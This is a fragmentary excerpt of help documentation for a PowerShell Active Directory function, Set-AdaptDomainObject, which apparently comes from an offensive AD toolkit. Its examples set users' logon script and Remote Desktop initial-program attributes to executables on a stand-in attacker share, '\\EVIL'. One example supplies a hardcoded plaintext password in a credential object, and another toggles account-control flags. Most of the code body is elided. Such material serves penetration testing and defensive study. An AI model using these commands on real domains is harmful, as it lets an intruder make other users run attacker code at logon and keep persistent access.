...
# --- Main Function: Set-AdaptDomainObject ---
...
Splats user/object targeting parameters to Get-AdaptDomainObject, returning the raw
...
Set-AdaptDomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose

VERBOSE: Get-DomainSearcher search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: Get-AdaptDomainObject filter string: (&(|(samAccountName=testuser)))
VERBOSE: Setting mstsinitialprogram to \\EVIL\program.exe for object testuser

.EXAMPLE

"S-1-5-21-890171859-3433809279-3366196753-1108","testuser" | Set-AdaptDomainObject -Set @{'countrycode'=1234; 'mstsinitialprogram'='\\EVIL\program2.exe'} -Verbose

VERBOSE: Get-DomainSearcher search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: Get-AdaptDomainObject filter string:
...
"S-1-5-21-890171859-3433809279-3366196753-1108","testuser" | Set-AdaptDomainObject -Clear department -Verbose

Cleares the 'department' field for both object identities.

.EXAMPLE

Get-AdaptDomainUser testuser | ConvertFrom-UACValue -Verbose
...
Set-AdaptDomainObject -Identity testuser -XOR @{useraccountcontrol=65536} -Verbose
...
Get-AdaptDomainUser -Identity testuser -Properties scriptpath
...
$SecPassword = ConvertTo-SecureString 'Password123!'-AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Set-AdaptDomainObject -Identity testuser -Set @{'scriptpath'='\\EVIL\program2.exe'} -Credential $Cred -Verbose
...
VERBOSE: [Set-AdaptDomainObject] Setting 'scriptpath' to '\\EVIL\program2.exe' for object 'testuser'
...
#>
    ...
    PROCESS {
        ...
        # splat the appropriate arguments to Get-AdaptDomainObject
